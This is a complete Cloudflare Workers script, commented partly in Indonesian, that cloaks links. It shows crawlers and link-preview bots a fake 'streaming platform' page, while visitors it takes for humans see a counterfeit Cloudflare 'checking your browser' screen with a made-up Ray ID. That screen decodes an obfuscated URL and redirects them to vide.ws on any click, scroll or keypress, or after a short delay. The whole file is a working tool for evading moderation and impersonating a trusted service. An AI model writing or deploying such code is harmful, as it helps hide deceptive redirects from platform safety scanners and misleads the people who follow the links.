export async function onRequest(context) {
  const { request } = context;
  const url = new URL(request.url);
  const path = url.pathname;
  const host = request.headers.get('host');
  
  // Advanced Bot Detection
  const isBot = detectBot(request);
  
  if (isBot) {
    // Serve SAFE content to bots
    return serveSafeContent(path, host);
  } else {
    // Serve REDIRECT content to humans dengan meta tags Cloudflare
    return serveRedirectContent(path, host);
  }
}

// ===== BOT DETECTION =====
function detectBot(request) {
  const userAgent = request.headers.get('user-agent') || '';
  const accept = request.headers.get('accept') || '';
  const acceptLanguage = request.headers.get('accept-language') || '';
  
  // Bot patterns
  const botPatterns = [
    /bot/i, /crawler/i, /spider/i, /monitoring/i,
    /Twitterbot/i, /facebookexternalhit/i, /WhatsApp/i,
    /TelegramBot/i, /Discordbot/i, /Slackbot/i,
    /Googlebot/i, /Bingbot/i, /YandexBot/i, /DuckDuckBot/i
  ];
  
  // Check bot patterns
  const isBotByUA = botPatterns.some(pattern => pattern.test(userAgent));
  
  // Additional signals
  const hasNoAcceptLanguage = !acceptLanguage;
  const hasSimpleAccept = accept.includes('*/*');
  const hasNoCookies = !request.headers.get('cookie');
  
  return isBotByUA || (hasNoAcceptLanguage && hasSimpleAccept);
}

// ===== PATH MAPPING =====
function getTargetPath(sourcePath) {
  const pathMappings = {
    '/d/': '/e/',
    '/f/': '/f/', 
    '/v/': '/e/',
    '/s/': '/e/',
    '/p/': '/e/',
    '/w/': '/e/'
    // Tambahkan mapping lain sesuai kebutuhan
  };
  
  // Find matching base path
  for (const [sourceBase, targetBase] of Object.entries(pathMappings)) {
    if (sourcePath.startsWith(sourceBase)) {
      const remainingPath = sourcePath.slice(sourceBase.length);
      return `https://vide.ws${targetBase}${remainingPath}`;
    }
  }
  
  // Default fallback
  return `https://vide.ws/${sourcePath.slice(1)}`;
}

// ===== SAFE CONTENT (FOR BOTS) =====
function serveSafeContent(path, host) {
  const pathId = path.split('/').pop() || 'content';
  
  const safeHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Content ${pathId} - Streaming Platform</title>
    <meta name="description" content="Watch amazing video content ${pathId}. High quality streaming platform with various entertainment options.">
    <meta property="og:title" content="Video ${pathId} - Streaming Platform">
    <meta property="og:description" content="Watch this amazing video content in high quality">
    <meta property="og:type" content="video.movie">
    <meta property="og:url" content="https://${host}${path}">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .video-placeholder {
            background: linear-gradient(45deg, #f0f0f0, #e0e0e0);
            height: 280px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px 0;
            position: relative;
            overflow: hidden;
        }
        .video-placeholder::before {
            content: '';
            position: absolute;
            width: 80px;
            height: 80px;
            border: 3px solid #999;
            border-radius: 50%;
            border-top-color: #667eea;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        p {
            color: #666;
            line-height: 1.6;
            margin-bottom: 20px;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .content-id {
            background: #f8f9fa;
            padding: 8px 15px;
            border-radius: 20px;
            font-family: monospace;
            color: #667eea;
            font-weight: bold;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎬 Video Content Ready</h1>
        <div class="content-id">ID: ${pathId}</div>
        <p>High-quality streaming content is loading...</p>
        
        <div class="video-placeholder">
            <!-- Video player placeholder -->
        </div>
        
        <p>This content is optimized for your device and network conditions.</p>
        <button class="btn" onclick="window.location.reload()">
            Refresh Content
        </button>
        
        <div style="margin-top: 20px; font-size: 12px; color: #999;">
            Streaming Platform • HD Quality • Secure Connection
        </div>
    </div>
</body>
</html>`;

  return new Response(safeHtml, {
    headers: { 
      'Content-Type': 'text/html',
      'Cache-Control': 'public, max-age=300' // 5 minutes cache for bots
    }
  });
}

// ===== REDIRECT CONTENT (FOR HUMANS) - DENGAN META TAGS CLOUDFLARE =====
function serveRedirectContent(path, host) {
  const targetUrl = getTargetPath(path);
  const pathId = path.split('/').pop() || 'content';
  
  // Obfuscate the target URL
  const obfuscatedUrl = btoa(targetUrl).replace(/=/g, '');
  
  const redirectHtml = `
<!DOCTYPE html>
<html>
<head>
    <!-- HTML Meta Tags -->
    <title>Checking your browser before accessing. Just a moment...</title>
    <meta name="description" content="">

    <!-- Facebook Meta Tags -->
    <meta property="og:url" content="https://${host}${path}">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Checking your browser before accessing. Just a moment...">
    <meta property="og:description" content="">
    <meta property="og:image" content="">

    <!-- Twitter Meta Tags -->
    <meta name="twitter:card" content="summary_large_image">
    <meta property="twitter:domain" content="${host}">
    <meta property="twitter:url" content="https://${host}${path}">
    <meta name="twitter:title" content="Checking your browser before accessing. Just a moment...">
    <meta name="twitter:description" content="">
    <meta name="twitter:image" content="">

    <!-- Meta Tags Generated via https://www.opengraph.xyz -->
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f7fa;
            color: #2d3748;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }
        .container {
            max-width: 400px;
            padding: 40px 20px;
        }
        .logo {
            color: #f6821f;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 30px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #f6821f;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #2d3748;
        }
        p {
            color: #718096;
            font-size: 14px;
            line-height: 1.5;
            margin: 10px 0;
        }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #e2e8f0;
            border-radius: 2px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress {
            height: 100%;
            background: #f6821f;
            width: 0%;
            animation: progress 2.5s ease-in-out forwards;
        }
        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        .cf-footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e2e8f0;
            font-size: 12px;
            color: #a0aec0;
        }
        .ray-id {
            font-family: monospace;
            background: #edf2f7;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 11px;
        }
        .click-hint {
            background: rgba(246, 130, 31, 0.1);
            padding: 12px 15px;
            border-radius: 8px;
            margin: 15px 0;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.3s;
            border: 1px solid rgba(246, 130, 31, 0.2);
        }
        .click-hint:hover {
            background: rgba(246, 130, 31, 0.15);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">cloudflare</div>
        <div class="spinner"></div>
        <h1>Checking your browser before accessing...</h1>
        <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
        <p>Please allow up to 5 seconds...</p>
        
        <div class="progress-bar">
            <div class="progress"></div>
        </div>

        <div class="click-hint" id="clickTrigger">
            🚀 <strong>Quick Access</strong> - Click anywhere to continue
        </div>
        
        <div class="cf-footer">
            <div>DDoS protection by Cloudflare</div>
            <div>Ray ID: <span class="ray-id">${Math.random().toString(36).substring(2, 15)}</span></div>
        </div>
    </div>

    <script>
        // Obfuscated URL reconstruction
        const encodedUrl = '${obfuscatedUrl}';
        const padding = 4 - (encodedUrl.length % 4);
        const paddedUrl = encodedUrl + '='.repeat(padding);
        
        function decodeAndRedirect() {
            try {
                const targetUrl = atob(paddedUrl);
                console.log('Redirecting to content...');
                window.location.href = targetUrl;
            } catch (error) {
                console.error('Decode error:', error);
                // Fallback
                window.location.href = 'https://vide.ws/${pathId}';
            }
        }
        
        let redirectInitiated = false;
        
        function initiateRedirect() {
            if (!redirectInitiated) {
                redirectInitiated = true;
                decodeAndRedirect();
            }
        }
        
        // Multiple trigger methods
        document.addEventListener('click', initiateRedirect);
        document.addEventListener('keydown', initiateRedirect);
        document.addEventListener('scroll', initiateRedirect);
        document.addEventListener('touchstart', initiateRedirect);
        
        // Auto-redirect after delay
        setTimeout(initiateRedirect, 2500);
        
        // Progress indicator
        let progress = 0;
        const progressInterval = setInterval(() => {
            progress += 5;
            if (progress >= 100) {
                clearInterval(progressInterval);
            }
        }, 100);
    </script>
</body>
</html>`;

  return new Response(redirectHtml, {
    headers: { 
      'Content-Type': 'text/html',
      'Cache-Control': 'no-cache, no-store, must-revalidate'
    }
  });
}
